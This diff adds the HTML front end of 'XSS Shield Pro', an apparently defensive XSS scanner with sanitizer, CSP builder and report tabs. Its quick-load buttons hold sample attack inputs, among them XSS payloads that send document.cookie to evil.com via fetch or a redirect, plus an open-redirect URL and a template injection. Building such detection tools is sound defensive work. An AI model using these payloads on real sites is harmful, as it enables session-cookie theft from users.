@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>XSS Shield Pro</title>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Outfit:wght@400;600;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="css/main.css">
+<link rel="stylesheet" href="css/components.css">
+</head>
+<body>
+<div class="wrap">
+
+<header>
+  <div class="brand">
+    <div class="brand-icon"></div>
+    <div>
+      <div class="brand-name">XSS Shield Pro <span class="brand-sub">// URL Threat Intelligence</span></div>
+    </div>
+  </div>
+  <div class="hdr-right">
+    <span class="pill pill-green" id="hdr-engine">ENGINE READY</span>
+    <span class="pill pill-cyan" id="hdr-rules">38 RULES</span>
+    <span id="hdr-clock"></span>
+  </div>
+</header>
+
+<div class="layout">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="s-section">
+      <div class="s-label">Threat Score</div>
+      <div class="score-ring">
+        <div class="score-num low" id="score-num">—</div>
+        <div class="score-label" id="score-label">Enter URL to scan</div>
+        <div class="score-bar"><div class="score-fill" id="score-fill"></div></div>
+      </div>
+      <div class="stat-row">
+        <div class="stat"><div class="stat-n r" id="s-crit">0</div><div class="stat-l">Critical</div></div>
+        <div class="stat"><div class="stat-n a" id="s-high">0</div><div class="stat-l">High</div></div>
+        <div class="stat"><div class="stat-n"   id="s-med">0</div><div class="stat-l">Medium</div></div>
+        <div class="stat"><div class="stat-n g" id="s-info">0</div><div class="stat-l">Info</div></div>
+      </div>
+    </div>
+    <div class="s-section">
+      <div class="s-label">Threat Categories</div>
+      <div class="cat-list" id="cat-list"><div class="cat-item"><span class="cat-name" style="color:var(--dim)">Awaiting scan</span></div></div>
+    </div>
+    <div class="s-section">
+      <div class="s-label">Scan History</div>
+      <div id="scan-history"><div style="font-size:.62rem;color:var(--dim)">No scans yet</div></div>
+    </div>
+  </aside>
+
+  <!-- MAIN -->
+  <main class="main">
+
+    <!-- Scanner Input -->
+    <div class="scanner-box">
+      <div class="scanner-top">
+        <span style="color:var(--cyan);font-size:.72rem;font-weight:500">▶ URL / INPUT SCANNER</span>
+        <span style="font-size:.63rem;color:var(--dim)">— Paste a full URL or raw payload. Press Enter or click SCAN.</span>
+      </div>
+      <div class="url-row">
+        <input class="url-input" id="url-input" type="text"
+          placeholder="https://example.com?q=<script>alert(1)</script>  OR  paste any raw HTML/payload" />
+        <button class="scan-btn" id="scan-btn">⬡ SCAN NOW</button>
+      </div>
+      <div class="quick-row">
+        <span class="quick-label">Quick load:</span>
+        <button class="qbtn" data-q="https://example.com/search?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;">Reflected XSS</button>
+        <button class="qbtn" data-q="&lt;img src=x onerror=fetch('http://evil.com/?c='+btoa(document.cookie))&gt;">Image onerror</button>
+        <button class="qbtn" data-q="https://shop.com/item?name=&lt;svg/onload=document.location='http://evil.com/?c='+btoa(document.cookie)&gt;">SVG redirect</button>
+        <button class="qbtn" data-q="&lt;iframe srcdoc='&lt;script&gt;parent.document.cookie&lt;/script&gt;' sandbox=allow-scripts&gt;">Iframe sandbox</button>
+        <button class="qbtn" data-q="https://bank.com/pay?redirect=http://evil.com&amount=1000">Open redirect</button>
+        <button class="qbtn" data-q="{{constructor.constructor('alert(1)')()}}">Template injection</button>
+      </div>
+      <div class="progress-zone" id="progress-zone">
+        <div class="prog-label" id="prog-label">Initialising...</div>
+        <div class="prog-track"><div class="prog-fill" id="prog-fill"></div></div>
+        <div class="prog-steps" id="prog-steps"></div>
+      </div>
+    </div>
+
+    <!-- Tabs -->
+    <div class="tabs">
+      <button class="tab active" data-tab="threats">⬡ Threats <span id="tab-count"></span></button>
+      <button class="tab" data-tab="prevention">⬡ Prevention</button>
+      <button class="tab" data-tab="sanitizer">⬡ Sanitizer</button>
+      <button class="tab" data-tab="csp">⬡ CSP Builder</button>
+      <button class="tab" data-tab="report">⬡ Report</button>
+      <button class="tab" data-tab="log">⬡ Log</button>
+    </div>
+
+    <!-- Tab: Threats -->
+    <div class="tc active" id="tc-threats">
+      <div class="empty" id="empty-threats">
+        <div class="empty-icon">🔍</div>
+        <div class="empty-title">No scan results yet</div>
+        <div class="empty-sub">Enter a URL or payload above and click SCAN NOW.</div>
+      </div>
+      <div id="threats-list"></div>
+    </div>
+
+    <!-- Tab: Prevention -->
+    <div class="tc" id="tc-prevention">
+      <div class="empty" id="empty-prev">
+        <div class="empty-icon">🛡</div>
+        <div class="empty-title">Run a scan first</div>
+        <div class="empty-sub">Prevention fixes are generated from detected threats.</div>
+      </div>
+      <div id="prev-list"></div>
+    </div>
+
+    <!-- Tab: Sanitizer -->
+    <div class="tc" id="tc-sanitizer">
+      <div class="san-info">Type raw HTML below to see real-time sanitization across all 3 strategies.</div>
+      <div class="san-grid">
+        <div class="san-panel full">
+          <div class="san-head"><span>Raw input</span><span class="san-badge danger">DANGEROUS</span></div>
+          <textarea class="san-ta" id="san-input" placeholder="Type any HTML here..."></textarea>
+        </div>
+        <div class="san-panel">
+          <div class="san-head"><span>HTML encoded</span><span class="san-badge safe">SAFE</span></div>
+          <div class="san-out" id="san-encoded">—</div>
+        </div>
+        <div class="san-panel">
+          <div class="san-head"><span>Tags stripped</span><span class="san-badge safe">SAFE</span></div>
+          <div class="san-out" id="san-stripped">—</div>
+        </div>
+        <div class="san-panel full">
+          <div class="san-head"><span>Allowlist filtered (safe tags only)</span><span class="san-badge safe">SAFE</span></div>
+          <div class="san-out" id="san-allowlist">—</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Tab: CSP -->
+    <div class="tc" id="tc-csp">
+      <div class="rem-box">
+        <div class="rem-head">⬡ Content Security Policy Generator</div>
+        <div class="rem-body" id="csp-toggles"></div>
+        <div class="rem-body" style="border-top:1px solid var(--border)">
+          <div class="code-label">HTTP Response Header</div>
+          <pre class="code-block cyan" id="csp-header"></pre>
+          <div class="code-label" style="margin-top:12px">HTML Meta Tag</div>
+          <pre class="code-block purple" id="csp-meta"></pre>
+        </div>
+      </div>
+    </div>
+
+    <!-- Tab: Report -->
+    <div class="tc" id="tc-report">
+      <div class="empty" id="empty-report">
+        <div class="empty-icon">📋</div>
+        <div class="empty-title">No report yet</div>
+        <div class="empty-sub">Run a scan to generate a full vulnerability report.</div>
+      </div>
+      <div id="report-body"></div>
+    </div>
+
+    <!-- Tab: Log -->
+    <div class="tc" id="tc-log">
+      <div class="log-box" id="main-log"></div>
+    </div>
+
+  </main>
+</div>
+</div>
+
+<!-- Modules loaded in order -->
+<script src="js/modules/api.js"></script>
+<script src="js/modules/logger.js"></script>
+<script src="js/modules/scanner_ui.js"></script>
+<script src="js/modules/threat_renderer.js"></script>
+<script src="js/modules/prevention_renderer.js"></script>
+<script src="js/modules/sanitizer_ui.js"></script>
+<script src="js/modules/csp_ui.js"></script>
+<script src="js/modules/report_ui.js"></script>
+<script src="js/modules/sidebar.js"></script>
+<script src="js/app.js"></script>
+</body>
+</html>
